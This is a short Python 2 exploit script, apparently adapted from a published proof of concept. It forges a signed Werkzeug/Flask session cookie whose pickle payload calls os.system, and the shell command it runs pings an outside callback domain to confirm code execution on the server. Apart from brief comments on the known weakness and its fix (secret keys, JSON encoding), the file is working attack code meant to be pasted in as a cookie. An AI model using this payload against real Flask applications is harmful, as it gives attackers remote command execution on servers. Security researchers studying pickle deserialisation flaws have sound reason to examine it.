# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'

'''
code from https://www.mxsasha.eu/blog/2013/04/26/proof-of-concept-arbitrary-remote-code-execution-pickle-sessions/
'''


# Arbitrary code execution cookie generator for Flask
# secure cookie-backed sessions by Erik Romijn

# Set the proper secret key, run the script and set the
# output as the value of your session cookie.
# Assumes sha1 hashing, pickle and base64 to be enabled.

# This is not a new vulnerability, but an exploit of a known
# issue: keep your secret keys secret at all times, and/or
# use json encoding for your cookie data, and this will not
# affect you, like the documentation recommends:
# http://werkzeug.pocoo.org/docs/contrib/securecookie/#security

# Inspired by http://nadiana.com/python-pickle-insecure
# Based on the secure cookie code from Werkzeug
secret_key = '1bb8)i&dl9c5=npkp248gl&aji7^x6izh3!itsmb6&yl!fak&f'
shell_command = 'ping -n 3 test.0y0.link || ping -c test.0y0.link'

import cPickle as pickle
from hmac import new as hmac
from hashlib import sha1 as hash_method

pdata = "cos\nsystem\n(S'%s'\ntR." % shell_command
value = ''.join(pdata.encode('base64').splitlines()).strip()

result = "|a=%s" % value
mac = hmac(secret_key, result, hash_method)
cookie = '%s?%s' % (
    mac.digest().encode('base64').strip(),
    result
)

print cookie